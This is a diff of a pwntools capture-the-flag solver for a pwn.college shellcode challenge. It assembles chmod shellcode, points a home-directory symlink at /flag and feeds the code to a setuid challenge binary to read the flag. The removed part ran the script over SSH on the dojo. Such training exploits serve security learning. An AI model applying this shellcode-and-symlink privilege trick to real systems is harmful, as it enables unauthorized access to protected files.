@@ -1,20 +1,18 @@
 import os
 import sys
 import pwn
+import pathlib
 
 pwn.context.arch = "amd64"
 pwn.context.os = "linux"
 
 shellcode = r"""
-/* Objective: Execute sys_chmod("f", 0777) */
-/* Pre-condition: rax is 0x0 */
-
-push 0x66
+/* sys_chmod("Z", 0004) */
+push 0x5a
 push rsp
 pop rdi
-push -1
-pop rsi
-mov al, 0x5a
+pop rax
+mov sil, 0x04
 syscall
 """
 shellbyte: bytes = pwn.asm(shellcode)
@@ -29,7 +27,7 @@ def hack(io: pwn.process):
     io.sendline(shellbyte)
 
 
-def boot():
+def ctf():
 
     def find_challenge(search_path="/challenge"):
         from pathlib import Path
@@ -38,9 +36,7 @@ def boot():
         xs = [
             str(f.absolute())
             for f in Path(search_path).iterdir()
-            if f.is_file()
-            and os.access(f, os.X_OK)
-            and (f.stat().st_mode & stat.S_ISUID)
+            if f.is_file() and os.access(f, os.X_OK) and (f.stat().st_mode & stat.S_ISUID)
         ]
         if not xs:
             raise FileNotFoundError(f"No executable found in {search_path}")
@@ -48,29 +44,20 @@ def boot():
             raise FileNotFoundError(f"Multiple executables found in {search_path}")
         return xs[0]
 
-    with pwn.process(find_challenge()) as io:
+    host()
+
+
+    # chmod file under /tmp will not work
+    home = pathlib.Path.home()
+    link = home / "Z"
+    link.symlink_to("/flag")
+    with pwn.process(find_challenge(), cwd=home) as io:
         tee(io)
         hack(io)
         io.recvrepeat()
-
-
-def main():
-    me = "/tmp/pwnsolver.py"
-    ssh = pwn.ssh(user="hacker", host="dojo.pwn.college", raw=True)
-    ssh.upload(os.path.abspath(__file__), me)
-    argv = ["/run/dojo/bin/python3", me]
-    io: pwn.tubes.ssh.ssh_process
-    io = ssh.process(argv, argv[0], aslr=True)  # type: ignore
-    with io:
-        tee(io)
-        try:
-            io.recvrepeat()
-        except KeyboardInterrupt:
-            if io.pid:
-                ssh.system(f"kill {io.pid}").wait()
-            io.kill()
-
-
+    print(link.read_text())
+    link.unlink()
+              
 def tee(process: pwn.tube):
     orig_send_raw = process.send_raw
     orig_recv_raw = process.recv_raw
@@ -92,8 +79,5 @@ def tee(process: pwn.tube):
 
 
 if __name__ == "__main__":
-    host()
-    if os.environ.get("DOJO_AUTH_TOKEN"):
-        boot()
-    else:
-        main()
+    # run with dojo.py
+    ctf()
